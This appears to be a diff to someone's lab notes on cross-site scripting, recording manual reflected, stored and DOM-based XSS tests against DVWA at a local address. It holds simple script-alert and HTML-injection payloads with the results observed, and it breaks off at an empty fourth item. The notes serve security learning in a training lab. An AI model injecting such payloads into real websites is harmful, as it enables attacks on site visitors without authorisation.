@@ -1,6 +1,19 @@
 CROSS-SITE SCRIPTING (XSS)
 
-1. Reflected XSS
+1. Reflected XSS -> Manual
 <script>alert("YOU ARE HACKED")</script>
+-> popup appears
+<h1>XSS TEST</h1>
+-> heading appears
 
-2. Stored XSS
+2. Stored XSS -> Manual
+name: test
+message: <script>alert("YOU ARE HACKED")</script>
+-> popup appears everytime page reloads
+-> stored
+
+3. DOM-based XSS -> Manual
+http://192.168.56.101/DVWA/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
+-> popup appears
+
+4. 
